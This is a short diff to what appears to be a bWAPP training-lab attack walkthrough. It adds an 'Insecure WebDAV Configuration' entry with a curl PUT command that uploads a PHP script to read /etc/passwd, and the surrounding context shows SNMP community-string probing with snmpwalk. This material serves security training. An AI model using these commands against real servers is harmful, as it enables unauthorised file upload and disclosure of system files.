@@ -397,6 +397,11 @@ $ snmpwalk -v2c -c private bwapp-server
 $ snmpwalk -v2c -c public bwapp-server
 ```
 
+### Insecure WebDAV Configuration
+```
+curl -X PUT --data '<?php $f=fopen("/etc/passwd","r"); echo fread($f,filesize("/etc/passwd")); fclose($f); ?>' 'http://192.168.1.10/webdav/attack.php'
+```
+
 # A6 - Sensitive Data Exposure 
 
 ### Base64 Encoding (Secret)
